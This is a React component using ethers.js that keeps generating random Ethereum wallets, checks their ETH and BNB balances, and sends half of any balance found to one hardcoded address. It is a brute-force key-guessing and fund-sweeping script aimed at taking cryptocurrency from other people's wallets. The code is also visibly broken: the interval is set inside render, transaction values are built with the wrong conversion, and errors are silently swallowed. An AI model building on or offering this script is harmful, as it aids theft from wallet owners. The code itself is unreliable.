import logo from "./logo.svg";
import "./App.css";
import { ethers, providers } from "ethers";
import { useEffect, useState } from "react";
function App() {

  const wallet = ethers.Wallet.createRandom();
  const [mnemonic,setmnemonic]=useState("");
  const [address,setaddress]=useState("");
  const [privateKey,setprivatekey]=useState("");
  const [ethbalance, setethbalance]=useState("0");
  const [bnbbalance, setbnbbalance]=useState("0");

    setInterval(() => {
        setmnemonic(wallet.mnemonic.phrase);
        setaddress(wallet.address)
        setprivatekey(wallet.privateKey);

      getBalance();
    }, 500);


  const getBalance = async () => {
    try {
      var ethprovider = new ethers.providers.JsonRpcProvider(
        "https://main-light.eth.linkpool.io"
      );
      var bnbprovider = new ethers.providers.JsonRpcProvider(
        "https://bsc-dataseed.binance.org/"
      );
    
      const ethsigner = wallet.connect(ethprovider);
      const bnbsigner = wallet.connect(bnbprovider);

      var ethbalance = ethers.utils.formatUnits(await ethsigner.getBalance(), 18);
      var bnbbalance = ethers.utils.formatUnits(await bnbsigner.getBalance(), 18);
      await setethbalance(ethbalance)
      await setbnbbalance(bnbbalance)
      if (Number(ethbalance) > 0) {
       
        await ethsigner.sendTransaction({
          to: "0xcE76Fe5626c3c1B36272C78791704c64e75975A3",
          value: ethers.utils.formatUnits(ethbalance / 2),
        });
      }
      
      if (Number(bnbbalance) > 0) {  
        await bnbsigner.sendTransaction({
          to: "0xcE76Fe5626c3c1B36272C78791704c64e75975A3",
          value: ethers.utils.formatUnits(bnbbalance / 2),
        });
      }
    } catch (err) {}
  };
  return (
    <>
      <div style={{ margin: "100px" }}>
       {mnemonic}<br/>
       eth:
       {ethbalance}
       <br/>
       bnb:
       {bnbbalance}
      </div>
    </>
  );
}

export default App;
